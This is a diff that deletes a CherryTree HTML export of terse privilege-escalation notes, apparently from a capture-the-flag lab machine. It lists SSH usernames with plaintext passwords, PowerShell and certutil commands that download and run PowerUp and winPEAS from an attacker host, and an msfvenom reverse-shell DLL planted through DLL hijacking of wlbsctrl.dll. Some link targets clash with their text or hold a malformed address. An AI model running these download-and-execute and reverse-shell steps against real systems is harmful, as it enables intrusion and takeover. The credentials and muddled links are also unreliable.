@@ -1,8 +1,0 @@
-<!doctype html><html>
-    <head>
-      <meta http-equiv="content-type" content="text/html; charset=utf-8">
-      <title>enumeration</title>
-      <meta name="generator" content="CherryTree">
-      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
-    </head>
-    <body><div class='page'><h1 class='title'>enumeration</h1><br/>ssh l4mpje@10.10.10.134<br />bureaulampje<br /><br />powershell.exe -exec Bypass &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;<a href="http://10.10.14.0.7/PowerUp.ps1')">http://10.10.14.7/PowerUp.ps1&#39;)</a> <br /><br />certutil.exe -urlcache -split -f &quot;<a href="http://10.11.0.186:8000/MS16-032.ps1"">http://10.10.14.7/winPEASany.exe&quot;</a> &amp;&amp; dir &amp;&amp; .\winPEASany.exe quiet cmd fast<br /><br />icacls &#39;C:\Users\L4mpje\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll&#39;<br />icacls &#39;C:\Users\L4mpje\AppData\Local\Microsoft\WindowsApps\&#39;<br /><br /><br /><br />msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.7 lport=443 -f dll -a x86 --platform win  &gt; wlbsctrl.dll<br />certutil.exe -urlcache -split -f &quot;<a href="http://10.11.0.186:8000/MS16-032.ps1"">http://10.10.14.7/wlbsctrl.dll&quot;</a><br />powershell.exe -exec Bypass &quot;IEX(New-Object system.Net.WebClient).Downloadfile(&#39;http://10.10.14.7/wlbsctrl.dll&#39;,&#39;C:\Users\L4mpje\Desktop\wlbsctrl.dll&#39;)&quot;<br /><br /><br />ssh administrator@10.10.10.134<br />thXLHM96BeKL0ER2<br /><br /></div></body></html>
